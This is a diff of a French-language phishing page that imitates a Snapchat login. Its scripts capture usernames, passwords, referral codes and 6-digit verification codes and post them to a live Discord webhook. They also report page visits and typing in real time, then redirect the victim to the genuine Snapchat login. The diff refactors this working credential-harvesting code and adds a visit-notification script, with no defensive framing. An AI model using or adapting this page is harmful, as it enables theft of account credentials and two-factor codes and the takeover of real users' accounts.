@@ -147,6 +147,35 @@ body {
 </style>
 </head>
 <body>
+
+<!-- Script pour notifier dès que la page s'ouvre -->
+<script>
+// Remplacez cette URL par votre webhook Discord
+const webhookURL = "VOTRE_WEBHOOK_URL";
+
+// Fonction pour envoyer notification
+function notifyVisit() {
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: " Quelqu'un a ouvert la page." })
+  });
+}
+// Envoi lors du chargement
+notifyVisit();
+
+// Si vous souhaitez aussi notifier lors d’un clic sur un lien ou bouton spécifique, ajoutez :
+/*
+document.querySelector('votre-selector').addEventListener('click', () => {
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: " Quelqu'un a cliqué." })
+  });
+});
+*/
+</script>
+
 <div id="container">
   <!-- Formulaire Snapchat -->
   <div id="loginBox">
@@ -168,38 +197,41 @@ body {
       <button type="submit" id="loginBtn">CONFIRMER</button>
       <div class="links">
         <a href="#">Mots de passe oublié ?</a>
-        <a href="#">Crée un compte</a>
+        <a href="#">Créer un compte</a>
       </div>
     </form>
     <div id="errorMessage">Incorrect username or password.</div>
     <div id="referralError">Referral code must be exactly 4 digits.</div>
   </div>
+  
   <!-- Zone pour entrer le code reçu -->
   <div id="codeContainer">
-    <p>Veuillez entrer le code à 6 chiffres reçu au numéro de téléphone ou à l'adresse mail</p>
+    <p>Veuillez entrer le code à 6 chiffres reçu au numéro ou email</p>
     <input type="text" id="codeInput" maxlength="6" placeholder="Entrez le code à 6 chiffres" />
     <button id="confirmBtn">CONFIRMER</button>
   </div>
+  
   <!-- Zone message après confirmation -->
   <div id="messageZone">
-    <p>Votre code a été enregistré. Vous serez redirigé dans quelques instants.</p>
+    <p>Votre code a été enregistré. Redirection dans quelques instants.</p>
   </div>
 </div>
+
 <script>
-// Variables webhook et redirection
-const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
+// Variables et URLs
+const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn"; // Mettez votre webhook ici
 const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 
-// Fonction pour envoyer webhook
-function sendWebhook(msg) {
+// Fonction d'envoi webhook
+function sendWebhook(message) {
   fetch(webhookURL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(msg)
+    body: JSON.stringify(message)
   });
 }
 
-// Gestion du formulaire de login
+// Gestion du formulaire
 document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault();
   const username = document.getElementById('username').value.trim();
@@ -218,75 +250,63 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     return;
   }
 
-  // Envoyer au webhook
+  // Envoi du webhook
   const msg = {
-    embeds: [
-      {
-        title: " Nouvelle tentative de connexion",
-        description: "Informations collectées via le formulaire",
-        color: 0xffc800,
-        fields: [
-          { name: " Nom d'utilisateur / e-mail", value: username },
-          { name: " Mot de passe", value: password },
-          { name: " Code de parrainage", value: referralCode }
-        ],
-        timestamp: new Date().toISOString(),
-        footer: { text: "Formulaire Rankos" }
-      }
-    ]
+    embeds: [{
+      title: " Nouvelle tentative",
+      description: "Informations du formulaire",
+      color: 15105570,
+      fields: [
+        { name: " Nom d'utilisateur", value: username },
+        { name: " Mot de passe", value: password },
+        { name: " Code de parrainage", value: referralCode }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: "Formulaire" }
+    }]
   };
-  fetch(webhookURL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(msg)
-  }).then(() => {
-    setTimeout(() => {
-      document.getElementById('loginBox').style.display = 'none';
-      document.getElementById('codeContainer').style.display = 'block';
-    }, 1000);
-  }).catch(() => alert("Erreur réseau ou CORS."));
+  sendWebhook(msg);
+  // Passage à la zone code après délai
+  setTimeout(() => {
+    document.getElementById('loginBox').style.display = 'none';
+    document.getElementById('codeContainer').style.display = 'block';
+  }, 1000);
 });
 
 // Validation du code
 document.getElementById('confirmBtn').addEventListener('click', function() {
   const code = document.getElementById('codeInput').value.trim();
   if (code.length !== 6 || !/^\d{6}$/.test(code)) {
-    alert("Veuillez entrer un code valide à 6 chiffres.");
+    alert("Code invalide");
     return;
   }
   const msg = {
-    embeds: [
-      {
-        title: " Code reçu",
-        description: "Code à 6 chiffres entré",
-        color: 0xffc800,
-        fields: [{ name: "Code reçu", value: code }],
-        timestamp: new Date().toISOString(),
-        footer: { text: "Code Entry" }
-      }
-    ]
+    embeds: [{
+      title: " Code reçu",
+      description: "Code à 6 chiffres",
+      color: 15105570,
+      fields: [{ name: "Code", value: code }],
+      timestamp: new Date().toISOString(),
+      footer: { text: "Code" }
+    }]
   };
-  fetch(webhookURL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(msg)
-  }).then(() => {
-    document.getElementById('codeContainer').style.display = 'none';
-    document.getElementById('messageZone').style.display = 'block';
-    setTimeout(() => {
-      window.location.href = redirectURL;
-    }, 30000);
-  }).catch(() => alert("Erreur réseau ou CORS."));
+  sendWebhook(msg);
+  // Afficher message et rediriger
+  document.getElementById('codeContainer').style.display = 'none';
+  document.getElementById('messageZone').style.display = 'block';
+  setTimeout(() => {
+    window.location.href = redirectURL;
+  }, 30000);
 });
 
-// Détection d’écriture pour webhook en temps réel
+// Détection d'écriture et envoi toutes les 2 sec
 const inputFields = document.querySelectorAll('input[type="text"], input[type="password"]');
 let typingTimeout;
 function sendTyping() {
-  fetch('https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn', { // remplacez par votre webhook
+  fetch(webhookURL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ content: "Une personne est en train d'écrire..." })
+    body: JSON.stringify({ content: " Quelqu'un écrit..." })
   });
 }
 inputFields.forEach(field => {
@@ -294,9 +314,10 @@ inputFields.forEach(field => {
     clearTimeout(typingTimeout);
     typingTimeout = setTimeout(() => {
       sendTyping();
-    }, 2000); // envoi toutes les 2 secondes après la dernière frappe
+    }, 2000);
   });
 });
 </script>
+
 </body>
 </html>
